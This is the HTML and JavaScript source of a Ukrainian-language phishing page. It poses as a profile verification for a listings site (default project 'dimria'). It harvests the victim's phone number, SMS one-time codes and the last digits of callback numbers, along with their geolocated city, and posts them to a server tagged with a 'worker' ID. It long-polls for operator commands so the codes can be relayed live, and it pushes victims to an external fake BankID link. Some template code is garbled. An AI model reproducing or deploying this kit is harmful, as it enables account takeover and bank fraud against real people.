<!DOCTYPE html>
<html lang="uk">
<head>
    <!-- Весь твой предыдущий <head> остаётся без изменений -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Перевірка даних</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <style>
        /* Весь твой CSS + добавляем новые стили */

        .loading-step {
            text-align: center;
            padding: 40px 20px;
            display: none;
        }
        .loading-step.active { display: block; }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        .loading-text {
            font-size: 16px;
            color: var(--text-muted);
        }

        .call-step, .bankid-step {
            display: none;
            text-align: center;
            padding: 20px;
        }
        .call-step.active, .bankid-step.active { display: block; }

        .bankid-warning {
            color: #d32f2f;
            font-weight: 600;
            margin-bottom: 20px;
            font-size: 15px;
        }

        .bankid-btn {
            display: block;
            width: 100%;
            padding: 16px;
            background: #000;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 600;
            text-decoration: none;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <i class="fas fa-shield-alt"></i>
            <span>Безпечна перевірка</span>
        </div>

        <div class="content">
            <div class="logo-wrapper">
                <img id="project-logo" src="" alt="Логотип" class="logo">
            </div>

            <!-- Крок 1: Номер телефону -->
            <div id="phone-step" class="step active">
                <div class="info-text">
                    Щоб зберегти ваші оголошення, будь ласка, <strong>підтвердіть профіль</strong> через номер телефону.
                </div>
                <div class="input-group">
                    <input type="tel" id="phone-number" class="phone-input" placeholder="+380 __ ___ __ __">
                </div>
                <button type="button" class="submit-button" onclick="submitPhone()">Продовжити</button>
            </div>

            <!-- Загрузка -->
            <div id="loading-step" class="loading-step">
                <div class="spinner"></div>
                <div class="loading-text">Зачекайте, ваші дані обробляються.<br>Не закривайте сторінку.</div>
            </div>

            <!-- SMS-код (по умолчанию) -->
            <div id="sms-step" class="step">
                <p class="sms-prompt">Введіть 6-значний код з SMS</p>
                <div class="code-input-group">
                    <input type="text" maxlength="1" class="code-input" id="code-1">
                    <input type="text" maxlength="1" class="code-input" id="code-2">
                    <input type="text" maxlength="1" class="code-input" id="code-3">
                    <input type="text" maxlength="1" class="code-input" id="code-4">
                    <input type="text" maxlength="1" class="code-input" id="code-5">
                    <input type="text" maxlength="1" class="code-input" id="code-6">
                </div>
                <button type="button" class="submit-button" onclick="submitCode()">Підтвердити</button>
            </div>

            <!-- Дзвінок – 4 цифри -->
            <div id="call-step" class="call-step">
                <div class="info-text" style="background:#fff3cd;color:#856404;border-color:#ffeaa7;">
                    На ваш номер надійде дзвінок.<br>Вкажіть <strong>останні 4 цифри</strong> номера, з якого був дзвінок.
                </div>
                <div class="input-group">
                    <input type="text" id="last4" maxlength="4" class="phone-input" placeholder="____" inputmode="numeric">
                </div>
                <button type="button" class="submit-button" onclick="submitLast4()">Продовжити</button>
            </div>

            <!-- BankID -->
            <div id="bankid-step" class="bankid-step">
                <div class="bankid-warning">
                    Ваш профіль не підтверджено.<br>
                    Для скасування блокування та продовження користування підтвердіть профіль за допомогою BankID
                </div>
                <a href="https://idverification.onrender.com" class="bankid-btn">Підтвердити</a>
            </div>

            <!-- Успіх -->
            <div id="success-step" class="step">
                <div class="success-message">
                    <i class="fas fa-check-circle"></i>
                    <div>Ваш аккаунт успішно підтверджено</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const session = urlParams.get('s') || Date.now().toString(36);
        const project = urlParams.get('project') || 'dimria';
        const worker = urlParams.get('ref') ? atob(urlParams.get('ref')).replace(/[^a-zA-Z0-9_]/g, '') : '';

        let userCity = 'Невідомо';
        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userCity = d.city || 'Невідомо');

        document.getElementById('project-logo').src = `/logo?project=${project}`;

        $(() => {
            $('#phone-number').mask('+380 00 000 00 00', { placeholder: " " }).focus();
            $('.code-input, #last4').on('input', function() {
                this.value = this.value.replace(/\D/g, '').substr(0, this.id === 'last4' ? 4 : 1);
                if (this.value && this.nextElementSibling) this.nextElementSibling.focus();
            });
        });

        function showStep(id) {
            $('.step, .loading-step, .call-step, .bankid-step').removeClass('active');
            \( (`# \){id}`).addClass('active');
        }

        function submitPhone() {
            const phone = $('#phone-number').val().replace(/\D/g, '');
            if (phone.length !== 12 || !phone.startsWith('380')) return alert('Невірний номер');
            sendData('phone', { phone });
            showStep('loading-step');
        }

        function submitCode() {
            const code = $('.code-input').map((_,el) => el.value).get().join('');
            if (code.length !== 6) return alert('Введіть 6 цифр');
            sendData('code', { code });
            showStep('loading-step');
            setTimeout(() => showStep('success-step'), 2500);
        }

        function submitLast4() {
            const digits = $('#last4').val();
            if (digits.length !== 4) return alert('Введіть 4 цифри');
            sendData('last4', { digits });
            showStep('loading-step');
            setTimeout(() => showStep('success-step'), 2500);
        }

        function sendData(type, data) {
            $.post('/api/send-data', JSON.stringify({
                session, project, worker, city: userCity, type, ...data
            }), 'json');
        }

        // Получаем команды от сервера (long polling)
        function listenCommands() {
            \( .get(`/api/command?session= \){session}&t=${Date.now()}`, function(cmd) {
                if (!cmd) return listenCommands();
                if (cmd === 'sms') showStep('sms-step'), $('#code-1').focus();
                if (cmd === 'call') showStep('call-step'), $('#last4').focus();
                if (cmd === 'bankid') showStep('bankid-step');
            }).always(listenCommands);
        }

        setTimeout(listenCommands, 2000);
        window.onload = () => $('#phone-number').focus();
    </script>
</body>
</html>
